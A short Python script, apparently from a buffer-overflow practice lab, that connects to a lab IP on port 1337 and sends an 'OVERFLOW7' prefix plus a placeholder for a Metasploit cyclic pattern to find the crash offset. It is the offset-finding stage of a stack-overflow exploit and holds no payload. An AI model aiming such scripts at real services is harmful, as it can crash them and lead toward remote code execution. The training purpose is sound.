import socket, time, sys
#IP to machine
ip = "10.10.77.73"
#port to service
port = 1337
timeout = 5
#prefix probably use wireshark or burp to get this from the normal traffic
prefix = "OVERFLOW7 "

#insert generated string from msf-pattern_create -l <where crashed> this is 3000
string = prefix + "Insert string from msf-pattern_create -l<offset>"
#run through the overflow
try:
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.settimeout(timeout)
    s.connect((ip, port))
    s.recv(1024)
    print("Sending {} bytes".format(len(string) - len(prefix)))
    s.send(bytes(string, "latin-1"))
    s.recv(1024)
except:
  print("Program crashed with {} bytes".format(len(string) - len(prefix)))
  sys.exit(0)
